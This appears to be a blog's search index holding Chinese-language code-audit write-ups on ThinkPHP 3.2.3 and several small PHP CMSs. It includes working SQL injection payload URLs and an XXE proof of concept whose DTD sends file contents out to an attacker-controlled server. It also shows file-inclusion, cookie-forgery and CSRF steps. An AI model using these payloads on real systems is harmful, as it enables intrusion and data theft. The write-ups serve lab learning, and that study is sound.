<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[ThinkPHP3.2.3安全开发须知]]></title>
    <url>%2F2019%2F11%2F16%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2FThinkphp3.2.3%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E9%A1%BB%E7%9F%A5%2F</url>
    <content type="text"><![CDATA[前言跟着phpoop师傅总结的一篇文章学习，选取了部分内容进行了复现以加深印象。 模板注入 通常这种情况是因为传入模板引擎中的值没有被过滤，从而导致恶意代码被执行。 display1234567public function testdisplay()&#123; #第四个参数可控 //会执行 $this-&gt;display('','','',$_GET['test']); //不会执行 $this-&gt;display('','','',I('test'));&#125; show1234567public function testdisplay()&#123; #第一个参数可控 //会执行 $this-&gt;show($_GET['test']); //不会执行 $this-&gt;show(I('test'));&#125; display21234public function testdisplay()&#123; $this-&gt;display(I('test'));&#125; 在根目录下放置 1.jpg，内容是&lt;?php phpinfo();?&gt; 从这里可知，display()指定模板路径时是从根目录开始的 fetch?根据参考文章中描述，以下代码是能触发模板注入的 12345678910111213#Firstpublic function testfetch()&#123; $content=$this-&gt;fetch(I('test')); var_dump($content);&#125;#Secondpublic function testfetch()&#123; $content=$this-&gt;fetch('',$_GET['test']); #$content=$this-&gt;fetch('',I('test','','')); var_dump($content);&#125; 但最终失败，原因尚不明确，猜测是一些配置的原因？ 失误造成的注入field注入 field方法属于模型的连贯操作方法之一，主要目的是标识要返回或者操作的字段，可以用于查询和写入操作。 控制器 123456public function sql()&#123; $model=M('user'); $table_name=I('table'); $test = $model-&gt;field($table_name)-&gt;select(); var_dump($test);&#125; payload 1http://127.0.0.1/tp3_2/Home/Index/sql?table=id from info where 1 and updatexml(1,concat(0x7e,database(),0x7e),1)-- 注入原因：框架内部未对传入field()的参数进行过滤，因为实际环境中这种情况并不常见 order注入控制器 1234567public function sql()&#123; //实例化数据模型 $model=M('user'); $order=I('order'); $test = $model-&gt;order($order)-&gt;select(); var_dump($test);&#125; payload 1http://127.0.0.1/tp3_2/Home/Index/sql?order[updatexml(1,concat(0x3a,user()),1)]=1 注入原因： 当参数为关联数组（key-value）时，key值拼接到返回值中，SQL语句最终绕过了框架安全过滤得以执行 comment注入控制器 123456public function sql()&#123; $model=M('user'); $comment=I('comment'); $test=$model-&gt;comment($comment)-&gt;select(); var_dump($test);&#125; payload 1http://127.0.0.1/tp3_2/Home/Index/sql?comment=*/where 1 and updatexml(1,concat(0x7e,database(),0x7e),1)/* 注入原因：框架底层未进行过滤，一般情况下实际环境该字段也并不可控 group注入控制器 123456public function sql()&#123; $model=M('user'); $group=I('group'); $test=$model-&gt;group($group)-&gt;select(); var_dump($test);&#125; payload 1http://127.0.0.1/tp3_2/Home/Index/sql?group=id and updatexml(1,concat(0x7e,database(),0x7e),1)-- 注入原因：框架底层未进行过滤 having注入控制器 123456public function sql()&#123; $model=M('user'); $having=I('having'); $test=$model-&gt;group('id')-&gt;having($having)-&gt;select(); var_dump($test);&#125; payload 1http://127.0.0.1/tp3_2/Home/Index/sql?having=1 and updatexml(1,concat(0x7e,database(),0x7e),1)-- 注入原因：框架底层未进行过滤 Count,Max,Min,Avg,Sum注入 这些用于SQL中统计数据的函数，当参数可控的情况下会导致注入 控制器 1234567public function sql()&#123; $model=M('user'); $test=I('test'); $model-&gt;count($test); //$model-&gt;max($test); //........&#125; payload 1http://127.0.0.1/tp3_2/Home/Index/sql?test=1) from user where 1 and updatexml(1,concat(0x7e,database(),0x7e),1)# setInc,setDec注入 setInc()和setDec()主要用于字段的更新，当外部可控制时将会造成注入 控制器 123456public function sql()&#123; $model=M('user'); $id=I('id'); $res=$model-&gt;where('id=2')-&gt;setInc('username',$ var_dump($res);&#125; payload 1http://127.0.0.1/tp3_2/Home/Index/sql?id=1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- where注入关于I()：I函数默认的过滤方法是htmlspecialchars，对sql注入的防御是没有太大的作用。 where注入弄清楚where的几种SQL形式即可，闭合即可注入 控制器 123456public function sql()&#123; $model=M('user'); $map=I('id'); $res=$model-&gt;where($map)-&gt;select(); var_dump($res);&#125; 传入?id=1，SQL： 1SELECT * FROM `user` WHERE ( 1 ) 传入?id[0]=0&amp;id[1]=1，SQL： 1SELECT * FROM `user` WHERE ( 1 ) AND ( 2 ) 语句拼接注入直接使用SQL语句拼凑的注入 其他补充limit注入tp3.x对这种不能预编译的语句参数没有进行什么处理，因而可能会导致注入。 limit注入相对来说少见，对MySQL版本要求在5.7以下，在MySQL5.5下复现成功，此处记录一下 12345678//示例代码public function read()&#123; $model=M('info'); $start = $_GET['start']; $limit = $_GET['limit']; $data = $model-&gt;limit($start,$limit)-&gt;select(); var_dump($data);&#125; 1mysql&gt; select * from test limit 1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1); 参考文章水文-Thinkphp3.2.3安全开发须知 Thinkphp3分析与审计]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ThinkPHP3.2.3注入分析]]></title>
    <url>%2F2019%2F11%2F15%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2Fthinkphp3.2.3%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[前言近段时间一直在学习tp3，终于搞清楚运作流程，也顺便分析下tp3.2.3爆出的注入漏洞。 北京时间 2018年8月23号11:25分 星期四，tp团队对于已经停止更新的thinkphp 3系列进行了一处安全更新，经过分析，此次更新修正了由于select(),find(),delete()方法可能会传入数组类型数据产生的多个sql注入隐患。 漏洞复现利用git下载漏洞修复之前的版本 下载源码： git clone https://github.com/top-think/thinkphp.git 使用git checkout 命令将版本回退到上一次commit： 1git checkout 109bf30254a38651c21837633d9293a4065c300b 漏洞分析find()和select() find()和select()函数处理流程相似，差别在于find存在limit 1限制，仅返回一条记录 本部分以find()为例 审计复现payload12345678table：http://127.0.0.1/tp3_2/Home/Index/sql?id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--alias：http://127.0.0.1/tp3_2/Home/Index/sql?id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--where: http://127.0.0.1/tp3_2/Home/Index/sql?id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)-- IndexController控制器：Home/Home/Controller/IndexController.class.php 123456789public function sql()&#123; //实例化数据模型 $model=M('user'); //接收数据 $id=I('id'); $res=$model-&gt;find($id); //$res=$model-&gt;select($id); print_r($res); &#125; table 传入第一个payload ?id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)– 函数调用流程 进入到public function find($options = array())方法内 文件位置：ThinkPHP/Library/Think/Model.class.php payload中参数id是以数组形式传入，则函数体内$options=array(&#39;table&#39;=&gt;&#39;user where........&#39;) 首先经过第一次if判断，但此处由于$options是以数组形式，因此绕过 1234567if (is_numeric($options) || is_string($options)) &#123; $where[$this-&gt;getPk()] = $options; $options = array(); $options['where'] = $where;&#125;// 根据复合主键查找记录$pk = $this-&gt;getPk();// 将当前表的主键赋值给$pk $pk的值是当前表的主键信息： 若当前表仅有一个主键，则$pk的值为string 若当前表有多个主键，这$pk的值是以数组的形式存在 该值在本漏洞中非常重要，当$pk为string类型时，会导致接下来的部分判断绕过；否则payload不生效 接下来的语句块是根据复合主键查询，因此处表为单主键，$pk为字符串类型，因此绕过判断 1234567if (is_array($options) &amp;&amp; (count($options) &gt; 0) &amp;&amp; is_array($pk)) &#123; // 根据复合主键查询 .........&#125;// 总是查找一条记录$options['limit'] = 1;$options = $this-&gt;_parseOptions($options); 进入到_parseOptions($options)函数体中 $options可控，同时本次payload中$options仅存在table字段，不存在where字段，可顺利通过函数验证 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647protected function _parseOptions($options = array()) &#123; if (is_array($options)) &#123; $options = array_merge($this-&gt;options, $options); /* * array_merge()将一个或多个数组合并成一个数组 * 本处$this-&gt;options为空 */ &#125; if (!isset($options['table'])) &#123;//option中无table下标时 // 自动获取表名 $options['table'] = $this-&gt;getTableName();//$option中添加 'table'=&gt;'[表名]' $fields = $this-&gt;fields; &#125; else &#123; // 指定数据表 则重新获取字段列表 但不支持类型检测 $fields = $this-&gt;getDbFields(); &#125; // 数据表别名 if (!empty($options['alias'])) &#123; $options['table'] .= ' ' . $options['alias']; &#125; // 记录操作的模型名称 $options['model'] = $this-&gt;name; // 字段类型验证 if (isset($options['where']) &amp;&amp; is_array($options['where']) &amp;&amp; !empty($fields) &amp;&amp; !isset($options['join'])) &#123; // 对数组查询条件进行字段类型检查 foreach ($options['where'] as $key =&gt; $val) &#123; $key = trim($key); if (in_array($key, $fields, true)) &#123; if (is_scalar($val)) &#123; /* * is_scalar($var)：检测变量是否是一个标量 * 标量变量是指那些包含了 integer、float、string 或 boolean的变量 */ $this-&gt;_parseType($options['where'], $key); &#125; &#125; &#125; &#125; // 查询过后清空sql表达式组装 避免影响下次查询 $this-&gt;options = array(); // 表达式过滤 $this-&gt;_options_filter($options); return $options; &#125; 往下进入到select()方法中 12345678910$resultSet = $this-&gt;db-&gt;select($options);#select()方法体public function select($options = array()) &#123; $this-&gt;model = $options['model']; $this-&gt;parseBind(!empty($options['bind']) ? $options['bind'] : array()); $sql = $this-&gt;buildSelectSql($options); $result = $this-&gt;query($sql, !empty($options['fetch_sql']) ? true : false, !empty($options['master']) ? true : false); return $result; &#125; 再进入到select方法体中buildSelectSql() 123456789public function buildSelectSql($options = array()) &#123; if (isset($options['page'])) &#123; // 根据页数计算limit .... &#125; $sql = $this-&gt;parseSql($this-&gt;selectSql, $options); return $sql;//SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1 &#125; 进入到parseSql()中，该方法主要用来利于前面获取的各字段信息，拼接SQL语句。 在此方法中，直接取出$options[‘table’]的值作为查询语句中的table 123456789101112131415161718192021public function parseSql($sql, $options = array()) &#123; $sql = str_replace( array('%TABLE%', '%DISTINCT%', '%FIELD%', '%JOIN%', '%WHERE%', '%GROUP%', '%HAVING%', '%ORDER%', '%LIMIT%', '%UNION%', '%LOCK%', '%COMMENT%', '%FORCE%'), array( $this-&gt;parseTable($options['table']), $this-&gt;parseDistinct(isset($options['distinct']) ? $options['distinct'] : false), $this-&gt;parseField(!empty($options['field']) ? $options['field'] : '*'), $this-&gt;parseJoin(!empty($options['join']) ? $options['join'] : ''), $this-&gt;parseWhere(!empty($options['where']) ? $options['where'] : ''), $this-&gt;parseGroup(!empty($options['group']) ? $options['group'] : ''), $this-&gt;parseHaving(!empty($options['having']) ? $options['having'] : ''), $this-&gt;parseOrder(!empty($options['order']) ? $options['order'] : ''), $this-&gt;parseLimit(!empty($options['limit']) ? $options['limit'] : ''), $this-&gt;parseUnion(!empty($options['union']) ? $options['union'] : ''), $this-&gt;parseLock(isset($options['lock']) ? $options['lock'] : false), $this-&gt;parseComment(!empty($options['comment']) ? $options['comment'] : ''), $this-&gt;parseForce(!empty($options['force']) ? $options['force'] : ''), ), $sql); return $sql; &#125; 因而SQL语句为 1SELECT * FROM user where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1 alias 传入第二个payload ?id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)– alias指别名，即SQL语句中表的别名 主要漏洞在于_parseOptions()方法中 ： 12345678910protected function _parseOptions($options = array()) &#123; ...... // 数据表别名 if (!empty($options['alias'])) &#123; $options['table'] .= ' ' . $options['alias']; &#125; ...... return $options; &#125; 直接将别名拼凑在表名的后面，从而导致了注入 最终注入语句： 1SELECT * FROM user where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1 where同上，进入到find()方法内 123456public function find($options = array())&#123; ...... $resultSet = $this-&gt;db-&gt;select($options); ......&#125; 跟进到select()方法中 1234567public function select($options = array()) &#123; ...... $sql = $this-&gt;buildSelectSql($options); $result = $this-&gt;query($sql, !empty($options['fetch_sql']) ? true : false, !empty($options['master']) ? true : false); return $result; &#125; 进入buildSelectSql()方法中 123456public function buildSelectSql($options = array()) &#123; ...... $sql = $this-&gt;parseSql($this-&gt;selectSql, $options); return $sql; &#125; parseSql()中拼接时将$option[‘where’]作为了where部分，拼接后导致注入 123456789101112131415161718192021public function parseSql($sql, $options = array()) &#123; $sql = str_replace( array('%TABLE%', '%DISTINCT%', '%FIELD%', '%JOIN%', '%WHERE%', '%GROUP%', '%HAVING%', '%ORDER%', '%LIMIT%', '%UNION%', '%LOCK%', '%COMMENT%', '%FORCE%'), array( $this-&gt;parseTable($options['table']), $this-&gt;parseDistinct(isset($options['distinct']) ? $options['distinct'] : false), $this-&gt;parseField(!empty($options['field']) ? $options['field'] : '*'), $this-&gt;parseJoin(!empty($options['join']) ? $options['join'] : ''), $this-&gt;parseWhere(!empty($options['where']) ? $options['where'] : ''), $this-&gt;parseGroup(!empty($options['group']) ? $options['group'] : ''), $this-&gt;parseHaving(!empty($options['having']) ? $options['having'] : ''), $this-&gt;parseOrder(!empty($options['order']) ? $options['order'] : ''), $this-&gt;parseLimit(!empty($options['limit']) ? $options['limit'] : ''), $this-&gt;parseUnion(!empty($options['union']) ? $options['union'] : ''), $this-&gt;parseLock(isset($options['lock']) ? $options['lock'] : false), $this-&gt;parseComment(!empty($options['comment']) ? $options['comment'] : ''), $this-&gt;parseForce(!empty($options['force']) ? $options['force'] : ''), ), $sql); return $sql; &#125; 最终注入语句： 1SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1 小试牛刀根据上面的漏洞复现发现，上面漏洞都有一个共同点：涉及parseSql()方法且$option可控，那么其他字段是否也存在注入呢？ 答案是肯定的…… p-grouppayload 123http://127.0.0.1/tp3_2/Home/Index/sql?id[group]=id and updatexml(1,concat(0x7e,user(),0x7e),1)--http://127.0.0.1/tp3_2/Home/Index/sql?id[group]=id and (select case when (ascii(mid(database() from 1 for 1))=116) then sleep(0.5) else 0 end) 获取$options[‘’group]中的值是parseGroup()完成的，因$options可控，且没有任何过滤，因此导致注入 1234protected function parseGroup($group)&#123; return !empty($group) ? ' GROUP BY ' . $group : '';&#125; 理论上其他字段都存在相应的漏洞风险，这里测试了distinct和group，这二者不存在漏洞。 漏洞修复根据官方的修复来看，主要是在各个方法中不再使用$options，改用$this-&gt;options，且不再使用_parseOptions($options)，因此$options不再可控，漏洞被修复。 delete()审计复现控制器： 123456789public function sql()&#123; //实例化数据模型 $model=M('user'); //接收数据 $id=I('id'); $res=$model-&gt;delete($id); //输出结果 print_r($res); &#125; 在传入payload复现之前，这里先输入一些正常数据看看SQL语句表现形式 传入?id=1时，SQL: 1DELETE FROM `user` WHERE `id` = '1' 关键代码：自动添加单引号 1234567protected function parseValue($value) &#123; if (is_string($value)) &#123; $value = strpos($value, ':') === 0 &amp;&amp; in_array($value, array_keys($this-&gt;bind)) ? $this-&gt;escapeString($value) : '\'' . $this-&gt;escapeString($value) . '\''; &#125; ...... &#125; 传入?id=1,2时，SQL：自动添加 IN、括号和单引号 1DELETE FROM `user` WHERE `id` IN ('1','2') 在这种情况下显然是无法进行注入的 payload12345table：http://127.0.0.1/tp3_2/Home/Index/sql?id[table]=user where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)--&amp;id[where]=1where: http://127.0.0.1/tp3_2/Home/Index/sql?id[where]=1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- where输入payload后跟进到delete()函数 12345678910111213141516public function delete($options = array()) &#123; $pk = $this-&gt;getPk(); ...... // 分析表达式 $options = $this-&gt;_parseOptions($options); if (empty($options['where'])) &#123; // 如果条件为空 不进行删除操作 除非设置 1=1 return false; &#125; ...... $result = $this-&gt;db-&gt;delete($options); ...... // 返回删除记录个数 return $result; &#125; 首先进入到_parseOptions($optinos) 该函数非常重要，在本例中没有起到作用，顺利通过 123456789101112131415161718192021222324252627protected function _parseOptions($options = array()) &#123; ...... // 数据表别名 if (!empty($options['alias'])) &#123; $options['table'] .= ' ' . $options['alias']; &#125; // 记录操作的模型名称 $options['model'] = $this-&gt;name; // 字段类型验证 if (isset($options['where']) &amp;&amp; is_array($options['where']) &amp;&amp; !empty($fields) &amp;&amp; !isset($options['join'])) &#123; // 对数组查询条件进行字段类型检查 foreach ($options['where'] as $key =&gt; $val) &#123; $key = trim($key); if (in_array($key, $fields, true)) &#123; if (is_scalar($val)) &#123; $this-&gt;_parseType($options['where'], $key); &#125; &#125; &#125; &#125; // 查询过后清空sql表达式组装 避免影响下次查询 $this-&gt;options = array(); // 表达式过滤 $this-&gt;_options_filter($options); return $options; &#125; 回到delete()函数中，进入$result = $this-&gt;db-&gt;delete($options);中 1234567891011121314public function delete($options = array()) &#123; $this-&gt;model = $options['model']; ...... $table = $this-&gt;parseTable($options['table']); $sql = 'DELETE FROM ' . $table; ...... $sql .= $this-&gt;parseWhere(!empty($options['where']) ? $options['where'] : ''); if (!strpos($table, ',')) &#123; // 单表删除支持order和limit ...... &#125; return $this-&gt;execute($sql, !empty($options['fetch_sql']) ? true : false); &#125; 进入parseWhere()中，$where为字符串，直接赋值给$whereStr 12345678910protected function parseWhere($where) &#123; $whereStr = ''; if (is_string($where)) &#123; // 直接使用字符串条件 $whereStr = $where; &#125; else &#123; ...... return empty($whereStr) ? '' : ' WHERE ' . $whereStr; &#125; 拼接到SQL语句中 注入成功 table payload： http://127.0.0.1/tp3_2/Home/Index/sql?id[table]=user where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)–&amp;id[where]=1 进入到$this-&gt;db-&gt;delete($options);中 123456789public function delete($options = array()) &#123; ...... $table = $this-&gt;parseTable($options['table']); $sql = 'DELETE FROM ' . $table; ...... $sql .= $this-&gt;parseWhere(!empty($options['where']) ? $options['where'] : ''); ...... &#125; 跟进到parseTable($options[&#39;table&#39;])，显然传入参数为字符串 12345678910protected function parseTable($tables) &#123; if (is_array($tables)) &#123; ...... $tables = $array; &#125; elseif (is_string($tables)) &#123; $tables = array_map(array($this, 'parseKey'), explode(',', $tables)); &#125; return implode(',', $tables); &#125; 在本方法中会先对传入参数值进行分割，再合并成数组，这里不会对payload造成影响 回到delete()方法中，成功拼接成注入语句 这里的payload中必须传入id[where]，原因在于delete()方法中，若无where字段值，直接返回false 参考文章ThinkPHP3.2 框架sql注入漏洞分析(2018-08-23)]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[S-CMS代码审计]]></title>
    <url>%2F2019%2F10%2F31%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2FS-CMS%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[来源：对S-CMS的一次全面审计 CMS官网：https://www.s-cms.cn/download.html 说明：目前官网已对漏洞进行修复，为便于复现取消了修补手段。 审计复现XXE-1全局搜索simplexml，在weixin/index.php发现漏洞（官网已修复） 非常标准的XXE，没有任何过滤手段，往下并未发现有输出XML解析结果的地方，此处应用无回显的XXE攻击手段 漏洞利用 首先在自己的服务器（192.168.64.131）上创建一个供靶机外部引用的dtd文件（test.dtd） 1234&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://192.168.64.131/?%file;&apos;&gt;&quot;&gt;%all; 发送POC 1234567&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/phpStudy/PHPTutorial/WWW/robots.txt&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.64.131/test.dtd&quot;&gt;%dtd;%send;]&gt; 然后在Apache日志中查看到结果： 在这里发现一个问题，查看其它php文件的内容会发生Detected an entity reference loop错误，查询资料发现libxml解析器默认限制外部实体长度为2k，无法突破，只能寻找压缩解决方案（但效果不明显） 12压缩：echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd");解压：echo file_get_contents("php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1"); 关于XXE： 最好的防御手段应该是禁止外部实体 12345678910PHP：libxml_disable_entity_loader(true);JAVA:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Python：from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 另外在libxml2.9之后，默认禁止外部实体 SQL注入-1在XXE-1往下看，存在SQL注入（已修复，添加防御函数t()） 根据文章注入 顺便看看修补的过滤函数，无法闭合语句达到绕过目的（此处修补了两次） SQL注入-2漏洞位置：index.php 跟进函数splitx() 12345function splitx($a, $b, $c)&#123; $d = explode($b, $a); return $d[$c];&#125; 先上payload 1http://127.0.0.1/index.PHP/a'%20where%20if(1,sleep(5),1)%23?action=update_dir 拼凑SQL语句 1update TABLE_config set C_dir='index.PHP/a' where if(1,sleep(5),1)#' 解释 $_SERVER[‘PHP_SELF’]：获取当前文件的路径 如：127.0.0.1/xxe/xml.php =&gt; /xxe/xml.php explode(separator,string,limit)：分割字符串形成数组 separator：规定在哪里分割字符串。 string：要分割的字符串。 limit：规定所返回的数组元素的数目。 如果使用index.php，结果如下： 123array (size=2) 0 =&gt; string '/index.php/' (length=5) 1 =&gt; string '/a' where if(1,sleep(5),1)#' (length=27) 被截断，但若使用index.PHP： 12array (size=1) 0 =&gt; string '/index.PHP/a' where if(1,sleep(5),1)#' (length=39) 前提：Windows系统下不区分文件大小写。 总结原计划先自己审计一次，但的确是积累不够，无法审计出，并且一些配置文件的代码经过混淆；所以决定按照文章进行复现，学习下思路。 虽然这个cms已修复，但复现的过程对代码审计有些收获：过去的几个审计是先黑盒确定功能点，再溯源代码，追踪数据，这种方式在小型CMS中可行，但中大型CMS中可能比较繁琐，需要耐心统计出所有功能并定位文件位置。现在一个小方法是积累风险函数字典，定位函数确定审计入手点，就如本CMS中的XXE漏洞。]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[熊海CMS代码审计]]></title>
    <url>%2F2019%2F10%2F20%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F%E7%86%8A%E6%B5%B7CMS%2F</url>
    <content type="text"><![CDATA[前言接下来的一段时间将进行PHP代码审计的学习，对简单CMS进行审计与记录。 代码审计先使用Seay源代码审计系统自动审计一下 简单浏览一下站点，发现浏览器文章时候可以指定id，怀疑存在sql注入 同时定位到/files/content.php 对id使用了addslashes()，无法进一步利用，在19行可以通过报错得出数据库和数据表名 addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 预定义字符是：单引号（’）、双引号（”）、反斜杠（\）、NULL SQL注入检查后台登录login.php文件 对输入数据完全没有进行过滤，那么可以爆出管理员密码 任意文件包含站点入口文件存在任意文件包含 登录到后台时发现了文件上传功能，可以上传图片马，再进行文件包含 上传功能仅对文件后缀进行了判断，白名单：jpg|jpeg|gif|bmp|png 首页包含即可：http://192.168.0.108/isea/index.php?r=../upload/touxiang/53311568373471.jpg 越权访问垂直越权，直接进入后台管理 进入/inc/checklogin.php，发现仅仅对cookie是否存在user字段是否存在进行判断，抓包添加user字段即直接进入后台管理 CSRF漏洞后台管理存在删除文件的功能，抓包查看 若直接访问，自动返回到登录界面 1http://192.168.0.108/isea/admin/?r=wzlist&amp;delete=18 抓包添加cookie user字段后成功删除文章 总结这套CMS结构非常的基础，作为代码审计初学者练手还是不错]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XDCMS 3.0代码审计]]></title>
    <url>%2F2019%2F10%2F20%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2FXDCMS3.0%2F</url>
    <content type="text"><![CDATA[环境准备PHP 5.4.45 Windows:10 代码审计后台登录存在SQL注入 漏洞链 system/modules/xdcms/login.php 123456789101112131415161718192021222324252627282930313233343536373839public function check()&#123; $username = safe_html($_POST['username']); $password = safe_html($_POST['password']); $verifycode = safe_html($_POST['verifycode']); if(empty($username)||empty($password))&#123; showmsg(C('user_pass_empty'),'-1'); &#125; if($verifycode!=$_SESSION['code'])&#123; showmsg(C('verifycode_error'),'-1'); &#125; $sql="select * from ".DB_PRE."admin where `username`='$username'"; if($this-&gt;mysql-&gt;num_rows($sql)==0)&#123; showmsg(C('user_not_exist'),'-1'); &#125; $rs=$this-&gt;mysql-&gt;get_one($sql); $password=password($password,$rs['encrypt']); if($password!=$rs['password'])&#123; showmsg(C('password_error'),'-1'); &#125; if($rs['is_lock']==1)&#123; showmsg(C('user_lock'),'-1'); &#125; $logins=$rs["logins"]+1; $ip=safe_replace(safe_html(getip())); $this-&gt;mysql-&gt;db_update("admin","`last_ip`='".$ip."',`last_time`=".datetime().",`logins`=".$logins,"`username`='$username'"); $_SESSION['admin']=$rs['username']; $_SESSION['admin_id']=$rs['id']; $_SESSION['groupid']=$rs['groupid']; unset($rs); showmsg(C("login_success"),"index.php?m=xdcms&amp;c=index"); &#125; safe_html() 123456function safe_html($str)&#123; if(empty($str))&#123;return;&#125; $str=preg_replace('/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file|outfile/','',$str); return htmlspecialchars($str);&#125; safe_html()使用preg_replace()时候，pattern未添加/i修饰符，导致过滤字符可通过大小写转换或双写进行绕过； 同时，htmlspecialchars()未添加参数，默认仅对双引号进行转义 payload 12345678910#爆库username=admin%27+OR+UPDATExml(1,concat('~',(database())),0)--+&amp;password=123&amp;verifycode=3bdd&amp;button=#爆表名username=admin%27+OR+UPDATExml(1,concat('~',(SELECT+group_concat(table_name)+frOm+information_scheMA.tables+whEre+table_schema+like+'xdcms')),0)--+&amp;password=123&amp;verifycode=3bdd&amp;button=//updatexml一次显示32位字符，需要偏转username=admin%27+OR+UPDATExml(1,concat(0x7e,substr((SELECT+group_concat(table_name)+frOm+information_scheMA.tables+whEre+table_schema+like+'xdcms'),30,30)),0)--+&amp;password=123&amp;verifycode=3bdd&amp;button=#爆表名username=admin%27+OR+UPDATExml(1,concat(0x7e,substr((SELECT+group_concat(column_name)+frOm+information_scheMA.columns+whEre+table_name+like+'c_admin'),1,32)),0)--+&amp;password=123&amp;verifycode=3bdd&amp;button=#爆内容username=admin%27+OR+UPDATExml(1,concat(0x7e,(selEct+password+From+c_admin)),0)--+&amp;password=123&amp;verifycode=3bdd&amp;button= 虽然获取密码hash值，但cms并未直接通过MD5获得哈希值，且无法破解该哈希值； 通过SQL注入获取到账户encrypt，再使用密码字典，依次爆破来猜测明文密码；另外可通过数据库写shell，但此时secure_file_priv被禁用 12345678function password($password, $encrypt='') &#123; $pwd = array(); $pwd['encrypt'] = $encrypt ? $encrypt : get_random(); $password_md5=md5(trim($password)); $nums=strlen($password_md5) - strlen($pwd['encrypt']);//encrypt:lr24vx2 $pwd['password'] = md5(substr_replace($password_md5,$pwd['encrypt'],$nums)); return $encrypt ? $pwd['password'] : $pwd;&#125; 友链添加存在SQL注入 友链title和url部分过滤函数成功防御了XSS，但对SQL过滤不全，关键代码如下： system/modules/link/admin.php 123456789public function addsave()&#123; $title=safe_html($_POST['title']); $url=safe_html($_POST['url']); if(empty($title)||empty($url))&#123; showmsg(C('material_not_complete'),'-1'); &#125; $this-&gt;mysql-&gt;db_insert('link',"`title`='".$title."',`url`='".$url."',`inputtime`='".datetime()."',`is_lock`=0"); showmsg(C('add_success'),'index.php?m=link&amp;c=admin');&#125; safe_html() 123456function safe_html($str)&#123; if(empty($str))&#123;return;&#125; $str=preg_replace('/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file|outfile/','',$str); return htmlspecialchars($str);&#125; 经检测，后台多处存在与上面原理相同SQL注入，不再一一记录。 数据库备份任意文件夹删除 漏洞点：system/modules/xdcms/data.php 123456789101112131415161718public function delete()&#123; $file=trim($_GET["file"]); $dir=DATA_PATH.'backup/'.$file; if(is_dir($dir))&#123; //删除文件夹中的文件 if (false != ($handle = opendir ( $dir ))) &#123; while ( false !== ($file = readdir ( $handle )) ) &#123; if ($file != "." &amp;&amp; $file != ".."&amp;&amp;strpos($file,".")) &#123; @unlink($dir."/".$file); &#125; &#125; closedir ( $handle ); &#125; @rmdir($dir);//删除目录 &#125; showmsg(C('success'),'-1'); &#125; 删除数据库备份时候仅判断是否为文件夹，是则删除其中所有的文件；同时未对目录进行过滤，导致可以删除任意文件夹中的文件 后台文件上传getshell？ 在网络中搜索他人审计文章，提到后台通过系统设置来允许php后缀文件上传，但实际发现cms已经对此修复过，将以php格式的文件自动转换为txt格式 123456789if ( $this-&gt;make_script_safe )&#123; if ( preg_match( "/\.(cgi|pl|js|asp|php|html|htm|jsp|jar)(\.|$)/i", $FILE_NAME ) )&#123; $FILE_TYPE = 'text/plain'; $this-&gt;file_extension = 'txt'; $this-&gt;parsed_file_name = preg_replace( "/\.(cgi|pl|js|asp|php|html|htm|jsp|jar)(\.|$)/i", "$2", $this-&gt;parsed_file_name ); $renamed = 1; &#125; &#125; 突然想到，可以上传.user.ini或.htaccess来getshell，但.user.ini需要当前目录下存在有能正常执行的php文件，此处无法满足条件 同时发现上传.htaccess后，后台会重新命名，无法利用上传getshell；如果服务器能解析php3、php4等格式文件就能绕过此限制，但这种情景较少。]]></content>
      <categories>
        <category>代码审计</category>
